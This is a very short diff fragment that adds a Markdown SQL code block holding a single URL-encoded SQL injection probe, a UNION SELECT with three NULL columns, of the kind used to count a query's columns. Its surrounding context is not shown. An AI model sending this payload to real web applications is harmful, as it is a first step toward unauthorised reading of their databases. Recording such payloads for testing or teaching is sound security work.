@@ -1,0 +1,4 @@
+
+```SQL
+'+UNION+SELECT+NULL,NULL,NULL--
+```
